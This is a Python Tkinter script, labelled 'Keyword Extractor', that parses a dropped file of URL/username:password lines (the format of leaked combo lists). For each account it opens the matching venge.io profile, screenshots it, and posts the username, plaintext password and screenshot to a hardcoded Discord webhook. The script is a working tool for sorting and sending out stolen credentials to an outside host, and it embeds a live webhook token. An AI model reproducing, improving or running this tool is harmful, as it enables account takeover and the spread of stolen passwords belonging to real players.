import re
import requests
import tkinter as tk
from tkinter import messagebox
from tkinterdnd2 import DND_FILES, TkinterDnD
import os
from datetime import datetime
import webbrowser  # To open the URL in the default browser
import time
import pyautogui  # To take screenshots and close the tab
import platform  # To check the operating system

# Hardcoded Discord webhook URL
WEBHOOK_URL = 'https://discord.com/api/webhooks/1295341967080816650/CHd2YW3bDQkN4Rkq8ZjTM8jI_uOXW3ws0xoTx98hY5QSGuS_E8YozvEoqH-iMhFbijyd'

def extract_lines_with_keyword(input_file, output_file, keyword):
    """Extract lines containing the specified keyword from the input file."""
    try:
        with open(input_file, 'r', encoding='utf-8', errors='ignore') as file, open(output_file, 'w', encoding='utf-8') as output:
            for line in file:
                line_cleaned = re.sub(r'[^\x00-\x7F]+', '', line)
                if keyword in line_cleaned:
                    output.write(line_cleaned.strip() + '\n')
        log_message(f"Success: Matching lines have been written to '{output_file}'")
        open_second_ui(output_file, keyword)
    except FileNotFoundError:
        log_error(f"File '{input_file}' not found.")
    except Exception as e:
        log_error(str(e))

def drop(event):
    """Handle file drop event."""
    file_path = event.data.strip('{}')
    input_file_entry.delete(0, tk.END)
    input_file_entry.insert(0, file_path)

def process_file():
    """Process the input file and extract lines with the specified keyword."""
    input_file = input_file_entry.get()
    output_file = 'user.txt'  
    keyword = keyword_entry.get()

    if input_file and keyword:
        extract_lines_with_keyword(input_file, output_file, keyword)
    else:
        log_error("Warning: Please provide a valid file and keyword.")

def extract_username_and_generate_url(input_file, output_file, keyword):
    """Extract usernames and generate URLs from the filtered lines."""
    try:
        with open(input_file, 'r', encoding='utf-8', errors='ignore') as file, \
             open(output_file, 'w', encoding='utf-8') as output, \
             open('bad.txt', 'a', encoding='utf-8') as bad_output:  # Append mode for bad.txt

            relevant_lines = []
            for line in file:
                line_cleaned = re.sub(r'[^\x00-\x7F]+', '', line.strip())
                if keyword in line_cleaned:
                    relevant_lines.append(line_cleaned)

            total_lines = len(relevant_lines)

            for index, line_cleaned in enumerate(relevant_lines):
                match = re.match(r'^https?://([^\s/]+)/([^:]+):([^/]+)$', line_cleaned)  # Adjusted regex to match URL pattern
                if match:
                    username = match.group(2)
                    password = match.group(3)  # Capture password
                    generated_url = f"https://social.venge.io/?player#{username}"
                    output.write(f"{generated_url}\n")
                    
                    # Open the website in the default browser and start the process
                    open_in_browser_and_wait(generated_url, username, password, index + 1, total_lines)

                else:
                    bad_output.write(f"Malformed line: {line_cleaned.strip()}\n")
                    log_error(f"Malformed line: {line_cleaned.strip()}")
    except FileNotFoundError:
        log_error(f"File '{input_file}' not found.")
    except Exception as e:
        log_error(str(e))
    finally:
        # Clean up the temporary files
        delete_files(['bad.txt', 'user.txt'])

def open_in_browser_and_wait(url, username, password, current_count, total_count):
    """Open the website in the default browser, wait for 6 seconds, and then take a screenshot of a specific region."""
    try:
        # Ensure the screenshots folder exists
        screenshots_folder = 'screenshots'
        if not os.path.exists(screenshots_folder):
            os.makedirs(screenshots_folder)

        # Open the URL in the default browser
        webbrowser.open(url)  # Open in default web browser
        log_message(f"Opening URL in browser: {url}")

        # Wait for 3 seconds (time for the website to load)
        time.sleep(4)

        # Use PyAutoGUI to take a screenshot of a specific region (0, 0, 500, 500)
        screenshot = pyautogui.screenshot(region=(100, 325, 100, 100))  # Define the region
        screenshot_path = os.path.join(screenshots_folder, f"screenshot_{username}.png")
        screenshot.save(screenshot_path)  # Save the screenshot

        # Close the browser tab using Command + W (for macOS) or Ctrl + W (for Windows/Linux)
        if platform.system() == 'Darwin':  # macOS
            pyautogui.hotkey('command', 'w')
        else:  # Windows/Linux
            pyautogui.hotkey('ctrl', 'w')  # Close the tab

        # Send the data to Discord with the screenshot, username, and password
        send_to_discord(username, password, url, screenshot_path, current_count, total_count)

    except Exception as e:
        log_error(f"Error opening URL in browser: {e}")

def send_to_discord(username, password, generated_url, screenshot_path, current_count, total_count):
    """Send content to Discord via webhook using embeds."""
    # Add a unique section header with a timestamp
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')

    # Format the message in a readable way, including the @everyone mention and progress count
    content = f"@everyone\n**New Player URL Generated**\n\n"
    content += f"**Username**: {username}\n"
    content += f"**Password**: {password}\n"
    content += f"**Generated URL**: {generated_url}\n"
    content += f"**Progress**: {current_count}/{total_count}\n"
    content += f"**Timestamp**: {timestamp}\n"

    # Attach the screenshot along with the message
    data = {
        "content": content  # This is the text message part
    }

    files = {
        "file": (screenshot_path, open(screenshot_path, 'rb'), "image/png")
    }

    try:
        # Send the data with the screenshot
        response = requests.post(WEBHOOK_URL, data=data, files=files)
        if response.status_code == 204:
            log_message(f"Successfully sent to Discord: {username}")
        else:
            log_error(f"Failed to send to Discord. Status code: {response.status_code}, Response: {response.text}")
    except requests.exceptions.RequestException as e:
        log_error(f"Request failed: {e}")

    # Clean up the screenshot after sending
    if os.path.exists(screenshot_path):
        os.remove(screenshot_path)

def log_error(message):
    """Log error messages and display them in the text box."""
    with open('bad.txt', 'a', encoding='utf-8') as bad_output:
        bad_output.write(f"Error: {message}\n")
    log_message(f"Error: {message}")

def log_message(message):
    """Log messages to the text box."""
    messages_box.configure(state=tk.NORMAL)
    messages_box.insert(tk.END, message + '\n')
    messages_box.configure(state=tk.DISABLED)

def delete_files(file_list):
    """Delete the specified files after processing."""
    for file_name in file_list:
        if os.path.exists(file_name):
            os.remove(file_name)
            log_message(f"{file_name} has been deleted.")
        else:
            log_message(f"{file_name} not found, skipping.")

def open_second_ui(input_file, keyword):
    """Open the second UI for generating URLs."""
    second_window = tk.Toplevel(root)
    second_window.title("Generate URLs")
    second_window.geometry("400x300")

    tk.Label(second_window, text="Extract usernames and generate URLs:").pack(pady=10)

    input_file_label = tk.Label(second_window, text=f"Input File: {input_file}")
    input_file_label.pack(pady=5)

    output_file_entry = tk.Entry(second_window, width=50)
    output_file_entry.insert(0, 'website.txt')  # Always save to 'website.txt'
    output_file_entry.pack(pady=5)

    process_button = tk.Button(second_window, text="Generate URLs", command=lambda: extract_username_and_generate_url(input_file, output_file_entry.get(), keyword))
    process_button.pack(pady=20)

# Create the main window
root = TkinterDnD.Tk()
root.title("Keyword Extractor")
root.geometry("400x400")

tk.Label(root, text="Drag and drop a text file here").pack(pady=10)

input_file_entry = tk.Entry(root, width=50)
input_file_entry.pack(pady=5)

# Bind drag and drop functionality
root.drop_target_register(DND_FILES)
root.dnd_bind('<<Drop>>', drop)

keyword_label = tk.Label(root, text="Enter keyword to search:")
keyword_label.pack(pady=5)

keyword_entry = tk.Entry(root, width=50)
keyword_entry.pack(pady=5)

process_button = tk.Button(root, text="Process File", command=process_file)
process_button.pack(pady=20)

# Create a text box for displaying messages
messages_box = tk.Text(root, height=10, width=50, state=tk.DISABLED)
messages_box.pack(pady=10)

root.mainloop()
